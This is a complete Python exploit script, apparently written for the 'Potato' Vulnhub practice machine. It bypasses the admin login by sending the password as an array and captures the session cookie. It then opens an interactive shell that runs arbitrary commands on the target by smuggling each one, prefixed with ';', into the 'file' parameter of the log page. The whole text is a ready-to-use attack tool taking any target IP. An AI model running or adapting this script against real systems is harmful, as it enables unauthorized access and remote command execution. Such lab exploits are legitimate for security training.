import requests,sys
from bs4 import BeautifulSoup
from cmd import Cmd

s = requests.session()
Ip = sys.argv[1]
sessid = ""

print("[*] Login to admin")
url = "http://"+ Ip + "/admin/index.php?login=1"
data = {'username':'admin','password[]':'1'}
x = s.post(url,data,allow_redirects=True)
if "Welcome!" in x.text:
    print("[+] Login to admin success!")
    sessid = s.cookies['pass']
    print("[+] Sessid admin : "+sessid)
else:
    print("[+] Login to admin failed!")
    
cookies = {"pass": sessid}
print('[*] Waiting for shell:')
class Term(Cmd):
    prompt = "Potato_Vulnhub> "
    def default(self, args):
        data={'file':';'+args}
        resp = requests.post("http://"+ Ip +'/admin/dashboard.php?page=log', data=data,cookies=cookies)
        soup = BeautifulSoup(resp.text)
        for pre_tag in soup.find_all('pre'):
            print(pre_tag.text)
        if args ==  "exit":
            exit()
term = Term()
term.cmdloop()